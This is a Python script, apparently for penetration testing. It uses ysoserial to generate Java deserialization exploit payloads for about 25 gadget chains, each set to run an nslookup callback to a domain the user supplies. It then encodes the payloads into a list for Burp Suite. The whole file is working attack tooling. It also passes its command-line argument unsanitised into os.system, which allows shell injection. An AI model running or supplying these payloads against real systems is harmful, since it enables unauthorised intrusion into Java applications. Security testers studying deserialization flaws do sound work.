import os
import urllib.parse
import sys

if len(sys.argv) != 2:
    print("Usage: python serialgen.py <domain>")
    sys.exit(1)

domain = sys.argv[1]

gadgets = [
    "BeanShell1",
    "Click1",
    "Clojure",
    "CommonsBeanutils1",
    "CommonsCollections1",
    "CommonsCollections2",
    "CommonsCollections3",
    "CommonsCollections4",
    "CommonsCollections5",
    "CommonsCollections6",
    "CommonsCollections7",
    "Groovy1",
    "Hibernate1",
    "Hibernate2",
    "JBossInterceptors1",
    "JRMPClient",
    "JavassistWeld1",
    "Jdk7u21",
    "MozillaRhino1",
    "MozillaRhino2",
    "Myfaces1",
    "ROME",
    "Spring1",
    "Spring2",
    "Vaadin1",
]

payloads = []

# Generates for normal gadgets
for gadget in gadgets:
    cmd = f'java -jar /opt/ysoserial-all.jar {gadget} "nslookup {gadget}.{domain}" | base64 > {gadget}.payload'
    os.system(cmd)
    payloads.append(f'{gadget}.payload')

# Generate for additional gadgets
cmd = f'java -jar /opt/ysoserial-all.jar URLDNS "http://{gadget}.{domain}" | base64 > URLDNS.payload'
os.system(cmd)
payloads.append(f'URLDNS.payload')

with open('burp_payloads.txt', 'w') as f:
    for payload_file in payloads:
        with open(payload_file, 'r') as p:
            payload = p.read()
            encoded_payload = urllib.parse.quote(payload)
            f.write(encoded_payload)
            f.write('\n')

print("Payloads generated and saved to 'burp_payloads.txt'")
